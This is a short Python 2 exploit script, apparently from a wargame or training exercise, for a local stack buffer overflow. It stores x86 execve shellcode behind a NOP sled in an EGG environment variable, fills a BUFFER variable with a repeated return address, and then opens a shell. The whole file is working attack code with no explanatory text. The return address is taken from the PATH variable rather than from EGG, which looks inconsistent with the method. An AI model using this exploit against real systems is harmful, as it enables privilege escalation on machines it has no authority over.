#!/usr/bin/python

import sys
import os
import ctypes
import subprocess

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

def mem_array(n):
    mem = "%s"%("00000000%x"%(n&0xffffffff))[-8:]
    return bytearray.fromhex(mem)

def create_egg(egg_size):
     egg = '\x90' * (egg_size - len(shellcode))
     egg += shellcode

     os.environ['EGG'] = egg;     


def create_overflow(buffer_size):
     libc = ctypes.CDLL("libc.so.6")
     ret_addr = mem_array(libc.getenv("PATH"))

     os.environ['BUFFER'] = str(ret_addr * buffer_size)

def main():
     if len(sys.argv) < 3:
        print "[-] Usage: ./exploit8.py egg_size buffer_size"
        exit(0)

     create_egg(int(sys.argv[1]))
     
     create_overflow(int(sys.argv[2]))

     subprocess.call(['sh'])

main()
